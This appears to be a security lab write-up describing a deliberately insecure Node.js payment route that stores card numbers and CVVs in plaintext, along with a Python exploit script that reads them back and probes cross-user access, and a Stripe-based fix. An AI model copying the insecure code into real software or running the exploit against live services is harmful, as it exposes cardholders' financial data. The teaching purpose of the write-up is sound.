# Vulnerability: Insecure Payment Gateway

## 1. Vulnerability Name
**CWE-311: Missing Encryption of Sensitive Data**

## 2. Location in Code
- **File:** `backend/src/routes/payment.js` (lines 8-58)
- **File:** `backend/src/models/User.js` (lines 47-57)

```javascript
// payment.js - Unencrypted sensitive data storage
router.post('/process', auth, async (req, res) => {
    try {
        const { 
            cardNumber, 
            expiryDate, 
            cvv, 
            cardholderName, 
            amount, 
            plan,
            billingAddress 
        } = req.body;

        // VULNERABILITY: No input validation
        // VULNERABILITY: Store payment data in plain text
        const paymentData = {
            cardNumber,
            expiryDate,
            cvv,
            cardholderName,
            amount,
            billingAddress,
            processedAt: new Date(),
            // VULNERABILITY: Predictable transaction ID
            transactionId: `TXN_${Date.now()}_${Math.floor(Math.random() * 1000)}`,
            status: 'completed'
        };

        // VULNERABILITY: Store sensitive payment info without encryption
        const user = await User.findById(req.user._id);
        if (!user.paymentHistory) {
            user.paymentHistory = [];
        }
        user.paymentHistory.push(paymentData);
        await user.save();

        // VULNERABILITY: Update tenant with payment info in plain text
        const tenant = await Tenant.findById(req.user.tenantId);
        if (tenant) {
            tenant.paymentInfo = {
                cardNumber,
                expiryDate,
                cvv,
                cardholderName,
                billingAddress
            };
            tenant.plan = plan || 'premium';
            tenant.lastPayment = paymentData;
            await tenant.save();
        }

        // VULNERABILITY: Return sensitive payment data in response
        res.json({
            success: true,
            message: 'Payment processed successfully',
            transactionId: paymentData.transactionId,
            // VULNERABILITY: Expose payment details
            paymentDetails: paymentData,
            newPlan: plan || 'premium'
        });
    } catch (error) {
        // VULNERABILITY: Expose internal error details
        res.status(500).json({ 
            error: 'Payment processing failed',
            details: error.message,
            stack: error.stack
        });
    }
});
```

## 3. Technical Root Cause
The payment system stores sensitive financial data (credit card numbers, CVV codes, expiry dates) in plaintext format without encryption. Additionally, there's no input validation, PCI-DSS compliance measures, or secure payment processing protocols.

## 4. Proof of Concept Explanation
1. Login to the application with valid credentials
2. Submit a payment with credit card details
3. Access the user's payment history through the API
4. Observe that all sensitive payment data is stored and returned in plaintext

## 5. Exploit Script

```python
#!/usr/bin/env python3
import requests
import json

def exploit_payment_gateway():
    base_url = "http://localhost:5000"
    
    # Login to get token
    login_data = {
        "email": "demo@tenantguard.com",
        "password": "demo123"
    }
    
    response = requests.post(f"{base_url}/api/auth/login", json=login_data)
    token = response.json().get('token')
    
    if not token:
        print("[-] Login failed")
        return False
    
    headers = {"Authorization": f"Bearer {token}"}
    
    # Submit payment with sensitive data
    payment_data = {
        "amount": 99.99,
        "cardNumber": "4532-1234-5678-9012",
        "expiryDate": "12/25",
        "cvv": "123",
        "cardholderName": "John Doe",
        "plan": "premium",
        "billingAddress": "123 Main St, City, State"
    }
    
    print("[+] Submitting payment with sensitive card data...")
    payment_response = requests.post(
        f"{base_url}/api/payment/process",
        headers=headers,
        json=payment_data
    )
    
    if payment_response.status_code == 200:
        result = payment_response.json()
        print("[+] Payment processed successfully")
        print(f"[!] PAYMENT DETAILS EXPOSED IN RESPONSE:")
        print(f"    Transaction ID: {result.get('transactionId')}")
        
        payment_details = result.get('paymentDetails', {})
        print(f"    Card Number: {payment_details.get('cardNumber')}")
        print(f"    CVV: {payment_details.get('cvv')}")
        print(f"    Expiry: {payment_details.get('expiryDate')}")
        
        # Retrieve payment history to show plaintext storage
        history_response = requests.get(
            f"{base_url}/api/payment/history",
            headers=headers
        )
        
        if history_response.status_code == 200:
            payment_history = history_response.json().get('paymentHistory', [])
            
            print("\n[!] PAYMENT VULNERABILITY CONFIRMED")
            print("[+] Sensitive payment data stored in plaintext:")
            
            for payment in payment_history:
                print(f"    Card Number: {payment.get('cardNumber')}")
                print(f"    CVV: {payment.get('cvv')}")
                print(f"    Expiry: {payment.get('expiryDate')}")
                print(f"    Cardholder: {payment.get('cardholderName')}")
                print("    ---")
        
        # Test cross-user payment access
        print("\n[+] Testing cross-user payment access...")
        cross_user_response = requests.get(
            f"{base_url}/api/payment/history?userId=different_user_id",
            headers=headers
        )
        
        if cross_user_response.status_code == 200:
            print("[!] BOLA VULNERABILITY: Can access other users' payment data")
            
        return True
    
    return False

if __name__ == "__main__":
    exploit_payment_gateway()
```

## 6. Impact
- **Financial Data Breach:** Exposure of credit card numbers, CVV codes, and personal information
- **PCI-DSS Violation:** Non-compliance with payment card industry standards
- **Identity Theft:** Sufficient data for fraudulent transactions
- **Regulatory Penalties:** Severe fines and legal consequences

**CVSS Score:** 9.4 (Critical)

## 7. Fix Recommendation

Implement secure payment processing:

```javascript
// Secure payment implementation
const crypto = require('crypto');
const stripe = require('stripe')(process.env.STRIPE_SECRET_KEY);

// Input validation middleware
const validatePaymentInput = (req, res, next) => {
    const { amount } = req.body;
    
    if (!amount || amount <= 0 || amount > 10000) {
        return res.status(400).json({ message: 'Invalid payment amount' });
    }
    
    next();
};

// Secure payment processing
router.post('/process', auth, validatePaymentInput, async (req, res) => {
    try {
        const { amount, paymentMethodId } = req.body;
        
        // Use Stripe for secure payment processing
        const paymentIntent = await stripe.paymentIntents.create({
            amount: Math.round(amount * 100), // Convert to cents
            currency: 'usd',
            payment_method: paymentMethodId,
            confirm: true
        });
        
        // Store only non-sensitive payment reference
        const paymentRecord = {
            amount: amount,
            stripePaymentId: paymentIntent.id,
            status: paymentIntent.status,
            timestamp: new Date(),
            userId: req.user._id,
            tenantId: req.user.tenantId
            // Never store card details
        };
        
        const user = await User.findById(req.user._id);
        if (!user.paymentHistory) {
            user.paymentHistory = [];
        }
        user.paymentHistory.push(paymentRecord);
        await user.save();
        
        res.json({ 
            message: 'Payment processed successfully', 
            paymentId: paymentRecord._id,
            status: paymentIntent.status
            // Never return sensitive payment data
        });
    } catch (error) {
        console.error('Payment error:', error);
        res.status(500).json({ message: 'Payment processing failed' });
    }
});

// Secure payment history with proper authorization
router.get('/history', auth, async (req, res) => {
    try {
        const user = await User.findById(req.user._id)
            .select('paymentHistory');
        
        if (!user) {
            return res.status(404).json({ message: 'User not found' });
        }
        
        // Return only non-sensitive payment data
        const sanitizedHistory = (user.paymentHistory || []).map(payment => ({
            id: payment._id,
            amount: payment.amount,
            status: payment.status,
            timestamp: payment.timestamp
            // Never return card details
        }));
        
        res.json({ paymentHistory: sanitizedHistory });
    } catch (error) {
        res.status(500).json({ message: 'Failed to retrieve payment history' });
    }
});
```